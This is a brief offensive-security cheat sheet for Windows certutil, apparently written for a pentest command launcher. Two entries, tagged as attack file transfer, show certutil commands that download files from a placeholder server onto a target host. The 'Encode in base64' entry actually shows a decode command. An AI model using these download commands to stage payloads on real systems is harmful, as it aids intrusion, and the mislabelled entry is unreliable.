# certutil

% windows, certutil

## download with certutil
#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>
```

## download with  certutil (2)
#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```
certutil.exe -verifyctl -f -split h http://<server>/<source_file> <dest_file>
```

## Encode in base64 with certutil 
#platform/windows #target/local #cat/UTILS
```
certutil -decode enc.txt <file>
```
